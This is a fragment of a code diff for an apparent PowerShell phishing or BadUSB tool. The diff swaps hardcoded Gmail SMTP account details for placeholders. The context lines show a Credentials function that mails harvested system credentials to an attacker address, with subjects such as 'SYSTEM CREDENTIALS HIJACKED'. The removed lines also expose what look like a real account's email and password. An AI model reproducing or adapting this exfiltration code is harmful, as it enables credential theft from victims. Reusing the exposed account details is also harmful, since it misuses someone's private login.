@@ -166,10 +166,10 @@ function Credentials() {
 	    	$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
 		$newline = "`r`n"
 		$SmtpServer = 'smtp.gmail.com'
-		$SmtpUser = 'firmusphising@gmail.com'
-                $smtpPassword = 'Firmus@123'
-                $MailtTo = 'firmusphising@gmail.com'
-                $MailFrom = 'firmusphising@gmail.com'
+		$SmtpUser = 'attacker@gmail.com'
+                $smtpPassword = 'password@123'
+                $MailtTo = 'attacker@gmail.com'
+                $MailFrom = 'attacker@gmail.com'
                 $Content  = $output
                 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
 		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
@@ -199,10 +199,10 @@ function Credentials() {
     
 
 $SmtpServer = 'smtp.gmail.com'
-$SmtpUser = 'firmusphising@gmail.com'
-$smtpPassword = 'Firmus@123'
-$MailtTo = 'firmusphising@gmail.com'
-$MailFrom = 'firmusphising@gmail.com'
+$SmtpUser = 'attacker@gmail.com'
+$smtpPassword = 'password@123'
+$MailtTo = 'attacker@gmail.com'
+$MailFrom = 'attacker@gmail.com'
 $MailSubject = "BAD USB LINK CLICKED!!!!"
 $Content  = $output
 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
